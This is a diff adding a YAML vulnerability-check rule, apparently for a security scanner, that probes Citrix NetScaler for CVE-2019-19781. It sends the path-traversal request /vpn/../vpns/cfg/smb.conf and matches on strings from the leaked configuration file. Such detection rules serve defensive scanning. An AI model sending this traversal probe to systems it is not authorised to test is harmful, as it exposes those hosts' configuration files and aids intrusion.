@@ -1,0 +1,17 @@
+detail:
+  author: su(https://suzzz112113.github.io/#blog)
+  links:
+  - https://www.tripwire.com/state-of-security/vert/citrix-netscaler-cve-2019-19781-what-you-need-to-know/
+expression: r0()
+manual: true
+name: poc-yaml-citrix-cve-2019-19781-path-traversal
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"encrypt passwords")
+      && response.body.bcontains(b"name resolve order")
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /vpn/../vpns/cfg/smb.conf
+transport: http
